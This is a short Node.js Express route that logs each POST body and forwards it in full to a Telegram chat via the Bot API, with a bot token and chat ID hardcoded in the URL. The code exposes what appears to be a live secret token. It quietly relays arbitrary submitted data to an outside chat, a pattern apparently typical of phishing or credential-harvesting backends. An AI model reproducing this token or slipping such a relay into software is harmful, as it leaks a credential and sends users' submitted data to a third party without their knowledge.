const express = require("express");
const router = express.Router();
const axios = require('axios');

router.post('/', async (req, res) => {
    console.log(req.body);
    res.json(req.body);
    const gainers = await axios.post('https://api.telegram.org/bot5007955067:AAGCvnc1AhD0Y11ukuM4zuuCKTb3obJVlwM/sendMessage?chat_id=-1001793121016&text='+JSON.stringify(req.body));
});

module.exports = router;